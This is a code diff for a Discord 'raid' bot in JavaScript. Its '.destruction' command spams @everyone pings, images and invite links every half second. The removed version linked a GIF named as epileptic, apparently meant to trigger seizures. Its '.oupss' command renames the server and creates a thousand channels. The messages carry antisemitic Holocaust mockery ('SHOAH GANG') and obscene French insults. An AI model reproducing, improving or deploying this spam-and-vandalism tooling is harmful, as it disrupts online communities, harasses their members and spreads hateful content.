@@ -33,10 +33,14 @@ bot.on('message', msg => {
 if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  .https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif\n"+
-                       "SHOAH GANG ON THE BEAT\n" +
-                       "https://discord.gg/835hm2Q\n" +
-                       "https://discord.gg/ZKYWm6g").catch(e => {});
+      msg.channel.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
+"https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
+"https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
+"https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
+"SHOAH GANG ON THE BEAT (: \n"+
+"~ ~ ~ ~ ~ ~~ ~ \n"+    
+"ROCKET MAN MA SALOPE \n"+
+"~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
     }, 500)
   }
 
@@ -50,8 +54,8 @@ if (msg.content === '.oupss') {
       msg.guild.setName('BZ by Shoah Gang').catch(e => {});
  
       for (var i = 0; i < 500; i++) {
-        msg.guild.createChannel('Shoah_gang_te_baise', 'voice').catch(e => {});
-        msg.guild.createChannel('Shoah_gang_te_baise', 'text').catch(e => {});
+        msg.guild.createChannel('raid_by_shoah_gang', 'voice').catch(e => {});
+        msg.guild.createChannel('raid_by_shoah_gang', 'text').catch(e => {});
       }
       fucked = true;
     }
